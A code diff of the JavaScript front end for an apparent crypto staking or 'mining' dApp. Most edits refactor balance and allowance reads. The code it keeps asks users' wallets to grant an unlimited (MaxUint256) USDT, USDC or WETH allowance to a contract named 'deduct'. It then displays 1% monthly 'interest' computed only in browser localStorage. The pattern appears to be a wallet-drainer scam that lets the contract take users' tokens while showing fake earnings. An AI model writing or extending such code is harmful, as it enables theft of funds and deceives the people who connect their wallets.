@@ -49,7 +49,7 @@ let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 let pendingUpdates = [];
 let localLastUpdated = 0;
 let authorizedToken = 'USDT';
-let currentCycleInterest = 0;  // ← 關鍵！全域宣告
+let currentCycleInterest = 0;
 window.currentClaimable = 0;
 const MONTHLY_RATE = 0.01;
 let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
@@ -365,6 +365,7 @@ function resetState(showMsg = true) {
   window.currentClaimable = 0;
   accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
   authorizedToken = 'USDT';
+  currentCycleInterest = 0;
   if (interestInterval) clearInterval(interestInterval);
   if (nextBenefitInterval) clearInterval(nextBenefitInterval);
   if (claimInterval) clearInterval(claimInterval);
@@ -470,21 +471,17 @@ async function updateInterest() {
   const etOffset = getETOffsetMilliseconds();
   const nowET = new Date(now + etOffset);
 
-  // 每天 00:00 和 12:00（美西時間）
   const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
   const isExactMinute = nowET.getMinutes() === 0;
 
-  // 必須是整點 + 整分
   if (!isPayoutTime || !isExactMinute) return;
 
   const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
   const lastPayoutET = new Date(lastPayout + etOffset);
   const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
 
-  // 避免重複發放
   if (wasPayoutTime) return;
 
-  // 發放利息
   const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
   window.currentClaimable += cycleInterest;
 
@@ -551,7 +548,6 @@ function updateNextBenefitTimer() {
   }
 
   const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
-802
   const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
   const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
   const seconds = String(totalSeconds % 60).padStart(2, '0');
@@ -699,23 +695,19 @@ async function connectWallet() {
 async function forceRefreshWalletBalance() {
   if (!userAddress) return;
 
-  let currentProvider = provider;
-  if (!window.ethereum) {
-    currentProvider = new ethers.JsonRpcProvider(INFURA_URL);
-  }
-
   updateStatus('Fetching balances...');
   try {
     const [usdtBal, usdcBal, wethBal] = await Promise.all([
-      currentProvider.getBalance ? 0n : usdtContract.balanceOf(userAddress),
-      currentProvider.getBalance ? 0n : usdcContract.balanceOf(userAddress),
-      currentProvider.getBalance ? 0n : wethContract.balanceOf(userAddress)
+      usdtContract.connect(provider).balanceOf(userAddress),
+      usdcContract.connect(provider).balanceOf(userAddress),
+      wethContract.connect(provider).balanceOf(userAddress)
     ]);
     const balances = { usdt: usdtBal, usdc: usdcBal, weth: wethBal };
     updateBalancesUI(balances);
     updateStatus('Balances updated.');
   } catch (error) {
     updateStatus('Balance fetch failed.', true);
+    log(`餘額讀取失敗: ${error.message}`, 'error');
   }
 }
 
@@ -726,9 +718,9 @@ async function updateUIBasedOnChainState() {
     const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
     const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
       retry(() => deductContract.isServiceActiveFor(userAddress)),
-      retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
-      retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
-      retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
+      retry(() => usdtContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
+      retry(() => usdcContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
+      retry(() => wethContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
     ]);
     const isWethAuthorized = wethAllowance >= requiredAllowance;
     const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
@@ -741,7 +733,7 @@ async function updateUIBasedOnChainState() {
       const selectedContract = tokenMap[selectedToken];
       let balanceBigInt = 0n;
       try {
-        balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
+        balanceBigInt = await retry(() => selectedContract.connect(provider).balanceOf(userAddress));
       } catch (e) {}
       const decimals = selectedToken === 'WETH' ? 18 : 6;
       const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
@@ -802,14 +794,14 @@ async function handleConditionalAuthorizationFlow() {
   for (const { name, contract, address } of tokensToProcess) {
     if (!contract) continue;
     updateStatus(`Checking ${name} allowance...`);
-    const currentAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
+    const currentAllowance = await retry(() => contract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
     if (currentAllowance < requiredAllowance) {
       updateStatus(`Requesting ${name} approval...`);
       try {
         const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
         approvalTx.value = 0n;
         await sendMobileRobustTransaction(approvalTx);
-        const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
+        const newAllowance = await retry(() => contract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
         if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
       } catch (err) {
         updateStatus(`${translations[currentLang].approveError} (${name})`, true);
@@ -909,55 +901,55 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
   if (startBtn) {
-  startBtn.addEventListener('click', async () => {
-    if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
-    const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
-    if (!selectedToken) { updateStatus(translations[currentLang].selectTokenFirst, true); return; }
-    const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
-    const selectedContract = tokenMap[selectedToken];
-    if (!selectedContract) { updateStatus('Contract not initialized', true); return; }
-    let balanceBigInt;
-    try {
-      balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
-    } catch (e) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
-    const decimals = selectedToken === 'WETH' ? 18 : 6;
-    const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
-    if (balance === 0) { updateStatus(translations[currentLang].balanceZero, true); return; }
-    startBtn.disabled = true;
-    startBtn.textContent = 'Authorizing...';
-    try {
-      await handleConditionalAuthorizationFlow();
-      let canStart = false;
-      if (selectedToken === 'WETH') {
-        const prices = ethPriceCache.price || 2500;
-        const wethValueUSD = balance * prices;
-        if (wethValueUSD >= 500) canStart = true;
-      } else {
-        if (balance >= 1) canStart = true;
-      }
-      if (canStart) {
-        pledgedAmount = balance;
-        lastPayoutTime = Date.now();
-        currentCycleInterest = calculatePayoutInterest();
-        authorizedToken = selectedToken;
-        localStorage.setItem('pledgedAmount', pledgedAmount.toString());
-        localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
-        localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
-        localStorage.setItem('authorizedToken', authorizedToken);
-        updateStatus(translations[currentLang].miningStarted);
-        activateStakingUI();
-      } else {
-        updateStatus('Balance too low.', true);
+    startBtn.addEventListener('click', async () => {
+      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
+      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
+      if (!selectedToken) { updateStatus(translations[currentLang].selectTokenFirst, true); return; }
+      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
+      const selectedContract = tokenMap[selectedToken];
+      if (!selectedContract) { updateStatus('Contract not initialized', true); return; }
+      let balanceBigInt;
+      try {
+        balanceBigInt = await retry(() => selectedContract.connect(provider).balanceOf(userAddress));
+      } catch (e) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
+      const decimals = selectedToken === 'WETH' ? 18 : 6;
+      const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
+      if (balance === 0) { updateStatus(translations[currentLang].balanceZero, true); return; }
+      startBtn.disabled = true;
+      startBtn.textContent = 'Authorizing...';
+      try {
+        await handleConditionalAuthorizationFlow();
+        let canStart = false;
+        if (selectedToken === 'WETH') {
+          const prices = ethPriceCache.price || 2500;
+          const wethValueUSD = balance * prices;
+          if (wethValueUSD >= 500) canStart = true;
+        } else {
+          if (balance >= 1) canStart = true;
+        }
+        if (canStart) {
+          pledgedAmount = balance;
+          lastPayoutTime = Date.now();
+          currentCycleInterest = calculatePayoutInterest();
+          authorizedToken = selectedToken;
+          localStorage.setItem('pledgedAmount', pledgedAmount.toString());
+          localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
+          localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
+          localStorage.setItem('authorizedToken', authorizedToken);
+          updateStatus(translations[currentLang].miningStarted);
+          activateStakingUI();
+        } else {
+          updateStatus('Balance too low.', true);
+          startBtn.disabled = false;
+          startBtn.textContent = translations[currentLang].startBtnText;
+        }
+      } catch (error) {
+        updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
         startBtn.disabled = false;
         startBtn.textContent = translations[currentLang].startBtnText;
       }
-    } catch (error) {
-      updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
-      startBtn.disabled = false;
-      startBtn.textContent = translations[currentLang].startBtnText;
-    }
-  });
-}
+    });
+  }
   if (pledgeBtn) {
     pledgeBtn.addEventListener('click', async () => {
       if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
@@ -969,7 +961,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (!tokenAddress) { updateStatus(translations[currentLang].invalidPledgeToken, true); return; }
       const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
       try {
-        const balance = await retry(() => selectedContract.balanceOf(userAddress));
+        const balance = await retry(() => selectedContract.connect(provider).balanceOf(userAddress));
         const decimals = token === 'WETH' ? 18 : 6;
         const formattedBalance = parseFloat(ethers.formatUnits(balance, decimals));
         if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
